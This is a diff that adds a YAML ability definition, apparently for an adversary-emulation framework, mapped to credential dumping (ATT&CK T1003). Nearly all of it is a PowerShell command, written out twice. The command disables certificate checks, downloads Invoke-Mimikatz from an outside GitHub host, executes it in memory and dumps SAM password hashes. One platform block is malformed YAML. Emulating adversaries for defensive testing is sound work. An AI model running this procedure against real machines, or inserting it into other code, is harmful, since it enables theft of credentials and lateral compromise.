@@ -1,0 +1,36 @@
+- id: effbedc1-1bc8-4a75-9395-980559700008
+  name: Credential Dumping using Process Injection
+  description: Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "5.A.1"
+  platforms:
+    windows:tln
+      psh,pwsh:
+        command: |
+          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+          $web = (New-Object System.Net.WebClient);
+          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          iex $result;
+          function hashdump
+          {
+              Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+          };
+          hashdump;
+
+  executors:
+  - name: powershell
+    command: |
+      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+      $web = (New-Object System.Net.WebClient);
+      $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+      iex $result;
+      function hashdump
+      {
+          Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
+      };
+      hashdump;
